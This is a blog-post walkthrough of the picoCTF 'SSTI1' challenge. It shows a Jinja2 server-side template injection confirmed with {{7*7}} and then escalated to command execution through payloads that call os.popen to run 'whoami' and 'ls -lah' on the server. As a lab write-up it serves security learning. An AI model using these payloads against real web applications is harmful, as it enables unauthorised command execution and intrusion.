---
layout: post
title: "SSTI1 PicoCTF"
date: 2025-09-16
categories: [ctf, picoctf, walkthrough]
image: https://miro.medium.com/v2/resize:fit:720/format:webp/1*DSmBoEWa8L36cCY8PEBX4g.png
permalink: /blog/SSTI1PicoCTF
locked: false
---

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps!

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/1*749ohjzhVKocSttt49oQWQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

If we type picoCTF , it would show this :

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/1*We7v-m3zd-UQpEYLKxGCFA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

let's try some template injection, in this case we are going to use this {% raw %}`{{7*7}}`{% endraw %}:

[PayloadsAllTheThings/Server Side Template Injection at master](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection?source=post_page-----0853498698d5---------------------------------------)

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/1*p6nuwKmCpJDW8EQ2qJtakA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

This time, we got 49 because 7 × 7 = 49. That means our injection works. Now, let's try some more advanced injections.

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Terminal">
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
</code></pre>
  {% endraw %}
</div>


<img 
  src="https://miro.medium.com/v2/resize:fit:2000/1*nIEgY-qk-0gDP50LEfcLdQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Terminal">
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -lah').read() }}
</code></pre>
  {% endraw %}
</div>



<img 
  src="https://miro.medium.com/v2/resize:fit:2000/1*ppTGzKKyJ-A80GgxnjNRNg.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

now we can read the flag.